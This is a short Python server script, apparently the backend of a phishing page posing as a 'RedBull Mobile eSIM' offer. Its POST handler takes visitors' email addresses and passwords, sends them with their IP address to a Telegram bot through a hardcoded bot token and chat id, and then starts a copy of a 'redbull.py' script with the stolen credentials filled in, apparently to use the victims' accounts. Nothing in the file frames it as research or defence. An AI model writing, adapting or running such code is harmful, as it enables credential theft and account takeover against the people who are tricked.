from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import random
import string
import requests
import os

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            with open("index.html", "rb") as file:
                self.wfile.write(file.read())
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"404 Not Found")

    def do_POST(self):
        client_ip = self.client_address[0]
        if self.path == "/kod_yurut":
            content_length = int(self.headers["Content-Length"])
            post_data = self.rfile.read(content_length).decode("utf-8")
            parsed_data = json.loads(post_data)
            eposta = parsed_data["email"]
            sifre = parsed_data["password"]
            bot = requests.get(f"https://api.telegram.org/bot6428331371:AAHsDPspRWFMitIEHUyd-3LvSzAQIVA3Rtk/sendMessage?chat_id=5826900952&text=RedBull Mobile eSIM\n\n[+]IP Adresi: {client_ip}\n\n[@]Eposta: {eposta}\n[#]Sifre: {sifre}")
            key = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))
            
            with open("redbull.py", "r", encoding="utf-8") as file:
                redbull_content = file.read()
            
            updated_content = redbull_content.replace(
                'data2 = {"email": "eposta","password":"sifre"}',
                f'data2 = {{"email":"{eposta}","password":"{sifre}"}}'
            )
            
            new_filename = get_new_filename("redbull", ".py")
            with open(new_filename, "w", encoding="utf-8") as file:
                file.write(updated_content)
            
            command = f"nohup python3 {new_filename} &"
            os.system(command)
            
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"key": key, "new_filename": new_filename}).encode())

def get_new_filename(base_filename, extension):
    index = 1
    new_filename = f"{base_filename}{index}{extension}"
    while os.path.exists(new_filename):
        index += 1
        new_filename = f"{base_filename}{index}{extension}"
        
    return new_filename

def run_server(server_class=HTTPServer, handler_class=RequestHandler, port=3169):
    server_address = ("", port)
    httpd = server_class(server_address, handler_class)
    print(f"Sunucu {port} portunda Calisiyor...")
    httpd.serve_forever()

if __name__ == "__main__":
    run_server()
